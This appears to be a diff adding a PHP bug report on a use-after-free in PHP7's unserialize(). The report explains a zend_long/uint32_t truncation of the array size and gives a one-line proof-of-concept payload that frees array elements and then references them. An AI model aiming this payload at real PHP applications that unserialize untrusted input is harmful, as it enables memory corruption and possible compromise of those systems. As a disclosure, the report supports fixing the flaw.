@@ -1,0 +1,54 @@
+Description:
+------------
+Use-after-free in PHP7's unserialize()
+
+
+```
+"a:" uiv ":" "{" {
+	zend_long elements = parse_iv(start + 2);
+	/* use iv() not uiv() in order to check data range */
+	*p = YYCURSOR;
+    if (!var_hash) return 0;
+
+	if (elements < 0) {
+		return 0;
+	}
+
+	array_init_size(rval, elements);
+```
+
+The elements is set to zend_long in during array deserialization.
+
+```
+ZEND_API int _array_init(zval *arg, uint32_t size ZEND_FILE_LINE_DC) /* {{{ */
+{
+	ZVAL_NEW_ARR(arg);
+	_zend_hash_init(Z_ARRVAL_P(arg), size, ZVAL_PTR_DTOR, 0 ZEND_FILE_LINE_RELAY_CC);
+	return SUCCESS;
+}
+```
+
+But size is set to uint32_t in array, and the default minimum size is 8.
+So there is zend_long/uint32_t confusion issue.
+
+```
+3020000000000000000000000000000001 ===> 3127371069258727425 ===> 1
+```
+
+So an attacker can initializing an array with 8 sizes via the following code.
+
+```
+a:3020000000000000000000000000000001:{
+```
+
+However the attacker can add more elements into the array, then the array will be resized.
+This means the attacker can free some elements's memory in the array then references to that already freed memory via R: or r:
+
+PoC:
+```
+<?php
+
+unserialize('a:3020000000000000000000000000000001:{i:0;a:0:{}i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;i:8;i:8;R:2;}');
+```
+
+
